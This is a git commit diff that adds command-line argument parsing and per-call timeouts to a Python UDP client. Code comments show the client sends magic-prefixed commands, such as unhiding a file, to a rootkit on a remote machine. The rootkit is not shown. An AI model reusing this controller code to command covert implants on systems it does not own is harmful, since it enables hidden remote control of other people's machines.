db319f91793db91a98570ce3f2e60b835494468d
Yanay Goor <yanay.goor@gmail.com>
2020-10-09 11:48:08 -0700

    Add argparse to client

--- client/client.py
+++ client/client.py
@@ -1,6 +1,7 @@
 import sys
 import random
 import struct
+from argparse import ArgumentParser
 from enum import Enum
 from threading import Condition, Thread
 from socket import socket, IPPROTO_UDP, SOCK_DGRAM, AF_INET, SocketType, timeout as timeout_error
@@ -21,11 +22,10 @@ class CommandType(Enum):
 
 
 class Client:
-    def __init__(self, remote=None, timeout=2):
+    def __init__(self, remote=None):
         self._sock: SocketType = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)
         # TODO: Should the socket just be non-blocking? That might slow down all other threads.
         self._sock.settimeout(0.1)
-        self._timeout = timeout
         # TODO: Use TTLCache from cacheutils to free responses that have not been awaited to.
         self._responses: Dict[int, int] = {}
         self._conditions: Dict[int, Condition] = {}
@@ -37,16 +37,16 @@ class Client:
     def bind(self, remote):
         self._remote = remote
 
-    def sendto(self, remote: str, command: CommandType, argument: str = ''):
+    def sendto(self, remote: str, command: CommandType, argument: str = '', *, timeout: Optional[float] = None):
         # TODO: Switch to randbytes in python 3.9
         job_id = random.randint(0, 2 ** JOB_ID_SIZE * 8 - 1)
         # TODO: ascii is kinda limiting, add support in the rootkit for another encoding.
         msg = MAGIC + struct.pack('H', job_id) + command.value + argument.encode('ascii')
         self._sock.sendto(msg, (remote, REQUEST_PORT))
-        return self._await_response(job_id)
+        return self._await_response(job_id, timeout)
 
-    def send(self, command: CommandType, argument: str = ''):
-        return self.sendto(self._remote, command, argument)
+    def send(self, command: CommandType, argument: str = '', *, timeout: Optional[float] = None):
+        return self.sendto(self._remote, command, argument, timeout=timeout)
 
     def close(self):
         self._should_stop = True
@@ -58,9 +58,9 @@ class Client:
             self._responses[job_id] = status
             self._conditions[job_id].notify()
 
-    def _await_response(self, job_id: int) -> Optional[int]:
+    def _await_response(self, job_id: int, timeout: Optional[float] = None) -> Optional[int]:
         with self._conditions.setdefault(job_id, Condition()):
-            notified = self._conditions[job_id].wait_for(lambda: job_id in self._responses, timeout=self._timeout)
+            notified = self._conditions[job_id].wait_for(lambda: job_id in self._responses, timeout=timeout)
         # Check whether the timeout was reached.
         if not notified:
             return None
@@ -79,6 +79,15 @@ class Client:
 
 
 if __name__ == '__main__':
-    s = Client(sys.argv[1])
-    print(s.send(CommandType.UNHIDE_FILE, '/home/yanayg/test_file2'))
+    parser = ArgumentParser()
+    parser.add_argument('remote_ip', type=str)
+    parser.add_argument('command_type', type=lambda val: CommandType(val.encode('ascii')))
+    parser.add_argument('argument', type=str, nargs='?', default='')
+    ns = parser.parse_args(sys.argv[1:])
+    s = Client(ns.remote_ip)
+    status = s.send(ns.command_type, ns.argument, timeout=1)
     s.close()
+    if status is None:
+        print('timed out')
+        sys.exit(1)
+    print(f'remote returned: {status}')
